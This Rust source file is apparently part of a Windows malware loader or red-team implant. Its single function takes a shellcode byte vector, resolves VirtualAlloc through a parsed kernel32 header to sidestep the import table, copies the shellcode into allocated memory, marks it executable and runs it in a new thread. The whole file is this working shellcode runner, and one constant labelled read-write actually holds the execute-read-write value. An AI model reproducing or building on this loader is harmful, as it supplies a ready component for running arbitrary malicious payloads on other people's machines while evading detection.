use std::error::Error;
use std::mem::transmute;
use std::ptr::copy;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
};
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
};
use crate::util::kernel32::{Kernel32};
use crate::util::pe_headers::PeHeader;

const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PROTECTION_FLAG_READ_WRITE: u32 = 0x40;
const PROTECTION_FLAG_EXECUTE: u32 = 0x10;

pub unsafe fn execute_local_thread(pe_header:PeHeader, shellcode: Vec<u8>) -> Result<HANDLE, Box<dyn Error>> {
    let shellcode_size = shellcode.len();

    let allocation_type = VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT_RESERVE);
    let protection_flags = PAGE_PROTECTION_FLAGS(PROTECTION_FLAG_READ_WRITE);
    
    let kernel32 = Kernel32::parse(pe_header);
    //let mem_pointer = VirtualAlloc(None, shellcode_size, allocation_type, protection_flags);

    let mem_pointer = kernel32.VirtualAlloc(None, shellcode_size, MEM_COMMIT_RESERVE, PROTECTION_FLAG_READ_WRITE);

    copy(
        shellcode.as_slice().as_ptr(),
        mem_pointer.cast(),
        shellcode_size,
    );

    let protection_flags = PAGE_PROTECTION_FLAGS(PROTECTION_FLAG_EXECUTE);

    let mut old_protection_flags: PAGE_PROTECTION_FLAGS = Default::default();

    match VirtualProtect(
        mem_pointer,
        shellcode_size,
        protection_flags,
        &mut old_protection_flags,
    ) {
        Ok(_) => (),
        Err(e) => return Err(Box::new(e)),
    };

    let thread_handle = CreateThread(
        None,
        0,
        Some(transmute(mem_pointer)),
        None,
        THREAD_CREATION_FLAGS(0),
        None,
    );

    match thread_handle {
        Ok(handle) => {
            WaitForSingleObject(handle, INFINITE);
            return Ok(handle);
        }
        Err(e) => return Err(Box::new(e)),
    };
}
